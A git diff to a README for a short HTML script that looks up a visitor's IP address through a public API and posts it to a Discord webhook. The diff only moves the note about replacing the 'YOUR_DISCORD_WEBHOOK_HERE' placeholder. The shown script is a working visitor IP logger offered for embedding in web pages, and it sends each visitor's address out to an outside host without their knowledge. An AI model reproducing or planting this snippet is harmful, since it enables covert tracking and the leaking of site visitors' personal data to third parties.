@@ -15,7 +15,7 @@ The script uses JavaScript's `fetch` API to send a GET request to `https://api.i
 
 ## Usage
 
-Simply include the script in your HTML file:
+Simply include the script in your HTML file. Just make sure to replace "YOUR_DISCORD_WEBHOOK_HERE" with your actual Discord webhook URL.:
 
 ```html
 <script>
@@ -27,5 +27,3 @@ Simply include the script in your HTML file:
         body: JSON.stringify({ content: ip })
     }));
 </script>
-
-##Make sure to replace "YOUR_DISCORD_WEBHOOK_HERE" with your actual Discord webhook URL.
